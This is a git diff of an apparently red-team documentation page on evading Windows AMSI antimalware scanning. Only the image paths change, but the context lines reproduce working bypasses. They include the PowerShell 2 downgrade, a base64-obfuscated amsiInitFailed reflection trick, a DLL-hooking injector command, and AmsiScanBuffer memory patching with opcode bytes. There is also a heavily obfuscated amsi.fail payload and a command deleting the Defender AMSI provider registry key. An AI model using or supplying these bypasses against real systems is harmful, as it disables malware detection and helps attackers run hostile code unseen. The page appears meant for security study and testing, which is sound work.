@@ -11,7 +11,7 @@ When a user executes a script or initiates PowerShell, the AMSI.dll is injected 
 
 If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software. The following diagram illustrates the process of AMSI scanning.
 
-![](../../.gitbook/assets/image%20%28235%29.png)
+![](../.gitbook/assets/image%20%28235%29.png)
 
 ## AMSI Evasions
 
@@ -38,7 +38,7 @@ Even though that Windows PowerShell 2.0 has been deprecated by Microsoft it hasn
 powershell -version 2
 ```
 
-![](../../.gitbook/assets/image%20%28238%29.png)
+![](../.gitbook/assets/image%20%28238%29.png)
 
 
 
@@ -58,7 +58,7 @@ Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 enc
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
-![](../../.gitbook/assets/image%20%28239%29.png)
+![](../.gitbook/assets/image%20%28239%29.png)
 
 ## 3. Hooking
 
@@ -70,7 +70,7 @@ Tom Carver created a proof of concept in the form of a DLL file which evades AMS
 .\SimpleInjector.exe powershell.exe .\AmsiHook.dll
 ```
 
-![](../../.gitbook/assets/image%20%28234%29.png)
+![](../.gitbook/assets/image%20%28234%29.png)
 
 ## 4. Memory Patching
 
@@ -87,7 +87,7 @@ The bypass has been released in C\# and PowerShell. The DLL can be loaded and ex
 [Amsi]::Bypass()
 ```
 
-![](../../.gitbook/assets/image%20%28242%29.png)
+![](../.gitbook/assets/image%20%28242%29.png)
 
 By default the PowerShell version is getting flagged. The [AMSITrigger](https://github.com/RythmStick/AMSITrigger) could be used to discover strings that are flagged by the AMSI by making calls to the “AmsiScanBuffer”. The following lines have been identified and will need to be obfuscated.
 
@@ -95,7 +95,7 @@ By default the PowerShell version is getting flagged. The [AMSITrigger](https://
 .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
 ```
 
-![](../../.gitbook/assets/image%20%28236%29.png)
+![](../.gitbook/assets/image%20%28236%29.png)
 
 Obfuscating the code contained within the PowerShell script will evade AMSI and perform the memory patching.
 
@@ -110,7 +110,7 @@ ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
 ```
 
-![](../../.gitbook/assets/image%20%28241%29.png)
+![](../.gitbook/assets/image%20%28241%29.png)
 
 A slightly different approach to the memory patching technique is to use different machine language instructions \(opcodes\) as it has been demonstrated in an [article](https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/) to achieve the result of **AMSI\_RESULT\_CLEAN**.
 
@@ -118,7 +118,7 @@ A slightly different approach to the memory patching technique is to use differe
 .\amsi-opcode.ps1
 ```
 
-![](../../.gitbook/assets/image%20%28240%29.png)
+![](../.gitbook/assets/image%20%28240%29.png)
 
 An alternative [bypass](https://www.contextis.com/us/blog/amsi-bypass) was released by [Paul Laine](https://twitter.com/am0nsec) which modifies the instructions of the [AMSI\_RESULT](https://docs.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result) function in memory to prevent sending the content to windows defender or to any other AMSI provider
 
@@ -126,7 +126,7 @@ An alternative [bypass](https://www.contextis.com/us/blog/amsi-bypass) was relea
 .\AMSI-Patch.ps1
 ```
 
-![](../../.gitbook/assets/image%20%28237%29.png)
+![](../.gitbook/assets/image%20%28237%29.png)
 
 ## 5. Forcing an Error
 
@@ -145,7 +145,7 @@ $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
 ```
 
-![](../../.gitbook/assets/image%20%28243%29.png)
+![](../.gitbook/assets/image%20%28243%29.png)
 
 Since there is a signature for the “amsiInitFailed” flag, [Adam Chester](https://twitter.com/_xpn_) discovered an alternative method which attempt to force a error in order the flag to be set in a legitimate way and not in the console. This bypass allocates a memory region for the “amsiContext” and since the “amsiSession” is set to null will result an error. The discovery has been described in the article “[Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)” in the MDSec website. Using this evasion without any obfuscation will fail as Microsoft has created signatures.
 
@@ -162,7 +162,7 @@ However an obfuscated version of this bypass exists in the [amsi.fail](https://a
 $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
 ```
 
-![](../../.gitbook/assets/image%20%28245%29.png)
+![](../.gitbook/assets/image%20%28245%29.png)
 
 ## 6. Registry Key Modification
 
@@ -172,7 +172,7 @@ AMSI Providers are responsible for the scanning process by the antivirus product
 HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
 ```
 
-![](../../.gitbook/assets/image%20%28246%29.png)
+![](../.gitbook/assets/image%20%28246%29.png)
 
 Removing the registry key of the AMSI provider will disable the ability of windows defender to perform AMSI inspection and evade the control. However, deleting a registry key is not considered a stealthy approach \(if there is sufficient monitoring in place\) and also requires elevated rights.
 
@@ -180,7 +180,7 @@ Removing the registry key of the AMSI provider will disable the ability of windo
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 ```
 
-![](../../.gitbook/assets/image%20%28233%29.png)
+![](../.gitbook/assets/image%20%28233%29.png)
 
 ## 7. DLL Hijacking
 
@@ -245,7 +245,7 @@ C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 
 Executing PowerShell outside of the standard directory will load the amsi.dll file which contains all the necessary functions to operate, however AMSI will not initiated.
 
-![](../../.gitbook/assets/image%20%28244%29.png)
+![](../.gitbook/assets/image%20%28244%29.png)
 
 
 
